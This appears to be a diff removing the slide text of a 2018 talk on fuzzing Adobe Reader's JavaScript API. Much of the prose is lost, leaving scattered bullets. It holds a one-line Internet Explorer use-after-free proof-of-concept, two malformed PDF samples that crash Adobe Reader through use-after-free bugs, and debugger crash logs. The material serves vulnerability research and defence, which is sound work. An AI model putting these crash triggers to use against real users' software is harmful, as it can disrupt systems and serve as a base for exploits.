@@ -1,266 +1,0 @@
-2 0 1 8
-
-
-· Swan · HeigeWeb · Hui GaoMSRC top 100
-· 
-·  · Adobe ·  · KPI
-
-
-· 2014 · 2014529IECVE-2014-1792 · POC
-· 72Use-After-Free · <!doctype><body onload=x.parentNode.applyElement(x)><body id=x><marquee>
-
-·  · UAFmshtml!CDragDropManager::DragOver+0x1f9 · Fuzzer ·  ·  · CVE-2014-1791
-
-
-·  ·  · Fuzz ·  · 
-
-
-· 
-·  · 
-· PDF
-· JS command · 
-· 
-· JS · 
-· 
-
-JS
-· app.execMenuItem("xx");
-· 76 actions: GoToPage, FitPage, TwoColumns ...
-· app.alert(xx) · console.show(); · this.mailDoc(true); · this.mailForm(true); · this.print(xx) · this.saveAs(xx) · this.insertPages(xx) · app.launchURL(xx) ·...
-
-
-
-
-· Adobe Reader
-·  ·  ·  ·...
-
-
-
-
-· 
-·  · Ctrl+H, Ctrl+LAlt+F4
-· 
-· mouse_event(...) ·  · 
-· 
-
-
-· 
-· ///
-· 
-·  · //
-·  · 
-· / · 
-
-
-·  ·  ·  ·  ·  · 
-
-
-· PDF ·  ·  ·  · crash · 
-
-
-· 
-·  · JS
-· 
-· JS
-· 
-· Dummy fuzzing
-
-
-·  · PDF() ·  ·  · 
-
-Fuzzing
-· docs.adobe.comJS API
-· 
-
-function obj(o){ for(i in o){ console.println(o[i]);
-} } obj(this);
-
-Fuzzing
-· docs.adobe.comJS API
-· 
-· objects
-
-6 0 obj << /Type /OCG /Name (Text) >> endobj 7 0 obj << /Type /OCG /Name (BigRect) >>endobj 8 0 obj << /Type /OCG /Name (SmallRect) >> endobj 21 0 obj <<
-/FT /Ch /Parent 10 0 R /Ff 1545433046 /T (mydata1) /Type /Annot /Subtype /Ink /Rect [50 320 100 345] /BS <</W 1 /S /B >>/H /P /AP << /N 22 0 R /D 23 0 R>> /AA 16 0 R >> endobj
-
-{"Text","BigRect","SmallRect","mydata1"}
-
-Fuzzing
-· docs.adobe.comJS API
-· 
-· objects · JS
-
-JS this.getField("")
-
- "mydata1"
-
-JS
-
-this.getField("mydata1")
-
-.setFocus()
-
-this.getField("mydata1").setFocus();
-
-Fuzzing
-· docs.adobe.comJS API
-· 
-· objects · JS · /JS
-
-1 0 obj << /Type /Catalog /Pages 2 0 R /OCProperties
-<< /OCGs [6 0 R 7 0 R 8 0 R] /D<</Order [7 0 R 8 0 R 6 0 R]>> >> /AcroForm 10 0 R /OpenAction 40 0 R >> endobj 40 0 obj << /Type /Action /S /JavaScript /JS 41 0 R >> endobj % JS program to exexute 41 0 obj << >> stream app.alert(`hmm, nice day!'); endstream endobj
-
-1 0 obj << /Type /Catalog /Pages 2 0 R /OCProperties
-<< /OCGs [6 0 R 7 0 R 8 0 R] /D<</Order [7 0 R 8 0 R 6 0 R]>> >> /AcroForm 10 0 R /OpenAction 40 0 R >> endobj 40 0 obj << /Type /Action /S /JavaScript /JS 41 0 R >> endobj % JS program to exexute 41 0 obj << >> stream this.getField("mydata1").setFocus(); endstream endobj
-
-Fuzzing
-
-· docs.adobe.comJS API
-· 
-· objects · JS · /JS
-
-Mutools!
-
-Fuzzing
-· Adobe Reader ·  ·  ·  ·  · GPG
-
-
-·  ·  ·  · /RAID
-
-
-· .pdf · .pdf · .pdf · .pdf
-
-Patched Sample 1
-· %PDF-1.6 · 1 0 obj <</Pages 2 0 R /OCProperties << >> /AcroForm 10 0 R /OpenAction 40 0 R>> · 40 0 obj <</S /JavaScript /JS 41 0 R>> · 41 0 obj <<>> · stream · try{app.execMenuItem("SinglePage");}catch(e){} · endstream · 2 0 obj <</Kids [3 0 R 3 0 R 3 0 R 3 0 R 3 0 R] /Count 5>> · 3 0 obj <</Resources << >> /Annots [ 11 0 R 21 0 R 42 0 R]>> · 4 0 obj <<>> · stream · endstream · 10 0 obj <</Fields [11 0 R 21 0 R 42 0 R]>> · 11 0 obj <</Rect [100 320 150 345] /AA 14 0 R>> · 21 0 obj << >> · 42 0 obj <</T (mydata2)>> · 14 0 obj <</PO 15 0 R>> · 15 0 obj <</Type /Action /S /JavaScript · /JS( · try{app.execMenuItem("NextPage");}catch(e){} · try{this.getField("mydata2").buttonSetIcon(this.addAnnot({page: 0,type: "Text",rect: [20, 46, 17, 7]}));}catch(e){} · )>> · trailer <</Root 1 0 R>>
-
-Patched Sample 1
-
-· (10a0.1cfc): Access violation - code c0000005 (!!! second chance !!!)
-
-· eax=002ad788 ebx=3cb181b8 ecx=4b3c8f38 edx=3d6fcfe8 esi=69007bfc edi=4b3c8f38
-
-· eip=681cd408 esp=002ad760 ebp=002ad760 iopl=0 nv up ei pl zr na pe nc
-
-· cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
-
-efl=00010246
-
-· AcroRd32_68010000!PDAlternatesGetCosObj+0x54f78:
-
-· 681cd408 8b11
-
-mov edx,dword ptr [ecx] ds:0023:4b3c8f38=????????
-
-· 1:009> !heap -p -a ecx
-
-· address 4b3c8f38 found in
-
-·
-
-_DPH_HEAP_ROOT @ 3a1000
-
-·
-
-in free-ed allocation ( DPH_HEAP_BLOCK: VirtAddr VirtSize)
-
-·
-
-55a21ccc: 4b3c8000
-
-2000
-
-·
-
-6f6a90b2 verifier!VerifierDisableFaultInjectionExclusionRange+0x00003162
-
-·
-
-77ba69cc ntdll!RtlpNtMakeTemporaryKey+0x000048b1
-
-·
-
-77b69e07 ntdll!EtwSetMark+0x0000eb7f
-
-·
-
-77b363a6 ntdll!wcsnicmp+0x00000caa
-
-·
-
-763bc614 kernel32!HeapFree+0x00000014
-
-·
-
-6de2ecfa MSVCR120!free+0x0000001a
-
-·
-
-68307cdc AcroRd32_68010000!CTJPEGLibTerminate+0x00014b7c
-
-·
-
-68307a45 AcroRd32_68010000!CTJPEGLibTerminate+0x000148e5
-
-·
-
-6818ef98 AcroRd32_68010000!PDAlternatesGetCosObj+0x00016b08
-
-·
-
-6818a74b AcroRd32_68010000!PDAlternatesGetCosObj+0x000122bb
-
-·
-
-6818a36e AcroRd32_68010000!PDAlternatesGetCosObj+0x00011ede
-
-Patched Sample 2
-
-· %PDF-1.2
-
-· 1 0 obj<</Pages 2 0 R /OCProperties <</D<</Order [7 0 R 8 0 R 6 0 R]>> >> /OpenAction 40 0 R>>
-
-· 40 0 obj<</S /JavaScript /JS(
-
-· app.alert(`click to trigger the crash'); %<=
-
-· this.zoom = 49;
-
-· this.getField("AF").setFocus();
-
-· )>>endobj
-
-· 2 0 obj<</Kids [3 0 R 3 0 R 3 0 R 3 0 R 3 0 R] /Count 5>>
-
-· 3 0 obj<</MediaBox [0 0 400 550] /Resources <<
-
->>
-
-/Annots [ 11 0 R 21 0 R 42 0 R] >>endobj
-
-· 11 0 obj<</FT /Tx /T (AF) /Subtype /Widget /Rect [100 320 150 345] /AA 14 0 R >>endobj
-
-· 14 0 obj<</PC 15 0 R >>endobj
-
-· 15 0 obj<</Type /Action /S /JavaScript /JS(app.execMenuItem("Find");)>>endobj
-
-· trailer <</Root 1 0 R>>
-
-Patched Sample 2
-· (1a40.840): Access violation - code c0000005 (first chance) · First chance exceptions are reported before any exception handling. · This exception may be expected and handled. ACROFORM!DllUnregisterServer+0x107759: · 55bbdc02 ff734c push dword ptr [ebx+4Ch] ds:002b:3f07cf0c=???????? · 0:000:x86> kv · ChildEBP RetAddr Args to Child · WARNING: Stack unwind information not available. Following frames may be wrong. · 002ceb00 55bcfec1 32172fa0 002ced48 55c049cf ACROFORM!DllUnregisterServer+0x107759 · 002ceb0c 55c049cf 00000001 00000001 bbd31539 ACROFORM!DllUnregisterServer+0x119a18 · 002ced48 55c004c2 56366bf8 c0010000 00000005 ACROFORM!DllUnregisterServer+0x14e526 · 002ced64 55bf7d63 56366bf8 c0010000 00000005 ACROFORM!DllUnregisterServer+0x14a019 · 002ceeb4 5802429c 56366978 c0010000 00000005 ACROFORM!DllUnregisterServer+0x1418ba · 002cef14 586d4f8b 00000000 00000000 173faef0 AcroRd32_57de0000!CTJPEGDecoderReadNextTile+0x4fe0c · 002cef44 586d61fc 00000000 bb8de7b7 173faef0 AcroRd32_57de0000!AIDE::PixelPartInfo::operator=+0x27a73b · 002cef90 5883b200 00000000 bb8de7f7 173faef0 AcroRd32_57de0000!AIDE::PixelPartInfo::operator=+0x27b9ac · 002cefd0 57f732c8 00000000 bb8df843 00000000 AcroRd32_57de0000!ixVectorNextHit+0x6a578 · 002cf064 5883b653 00000000 bb8df897 00000000 AcroRd32_57de0000!PDAlternatesGetCosObj+0x2ae38 · 002cf0b0 586d6f92 00000000 bb8df8df 215661b8 AcroRd32_57de0000!ixVectorNextHit+0x6a9cb · 002cf0f8 5850ba83 00000000 00000000 002cf158 AcroRd32_57de0000!AIDE::PixelPartInfo::operator=+0x27c742 · 002cf108 55af0c8a 215661b8 c0010000 00000005 AcroRd32_57de0000!AIDE::PixelPartInfo::operator=+0xb1233 · 002cf158 57e6ee62 347faff0 bb8df9bb 3b00cff0 ACROFORM!DllUnregisterServer+0x3a7e1 · 002cf19c 57e6e7b7 0000041d bb8dfa2b 0000041d AcroRd32_57de0000!DllCanUnloadNow+0x1dce6
-
-
-· 32Windows 71280x800Adobe Reader.pdf
-
-
-
-
-·  · "store and share files"
-JS.pdf
-
-
-· Fuzzing10 ·  ·  ·  · KCON · -.jpg
-
-
-· 
-
-
